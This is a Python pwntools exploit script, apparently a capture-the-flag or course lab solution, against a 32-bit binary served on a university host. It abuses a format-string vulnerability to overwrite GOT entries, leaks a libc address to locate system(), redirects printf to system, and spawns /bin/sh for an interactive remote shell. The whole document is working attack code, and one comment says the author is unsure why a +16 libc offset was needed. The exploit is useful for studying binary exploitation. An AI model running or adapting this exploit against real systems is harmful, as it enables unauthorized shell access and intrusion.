#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *exit
            b *loop+207
            c
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10059)

    return r


def main():
    r = conn(3)

    addrExitGot = 0x804a018
    addrPrintfGot = 0x804a00c

    addrLoop = 0x080487fe
    addrLoopPlus39 = 0x08048825

    # r.sendline(b"exit ZZZ" + b"A"*4 + b".%08x"*20)
    offset = 15
    writeTo = {addrExitGot: addrLoop}
    payload = b"exit ZZZ" + fmtstr_payload(offset, writeTo, numbwritten=3)
    r.sendline(payload)

    r.sendline(b"exit ZZZ" + b"A"*4 + b".%08x"*30 + b"LEAKSTDIO:%10$08x")
    r.recvuntil(b"STDIO:")
    leakStdio = int(r.recvuntil(b"C")[:-1], 16)
    print("LEAK Stdio:", hex(leakStdio))

    sStdio = 0xf7f935a0
    sSystem = 0xf7e1d940

    offsetSystem = sSystem - sStdio

    leakSystem = leakStdio + offsetSystem

    print("System:", hex(leakSystem))
    print("System:", hex(libc.symbols["system"]))

    writeTo = {addrPrintfGot: leakSystem + 16, # this plus 16 are duo to libc deslocation at the server not absolute sure about the reason
               addrExitGot: addrLoopPlus39}

    payload = b"exit ZZZ" + fmtstr_payload(offset, writeTo, numbwritten=3)
    r.sendline(payload)
    r.sendline(b"exit /bin/sh;")

    r.interactive()

if __name__ == "__main__":
    main()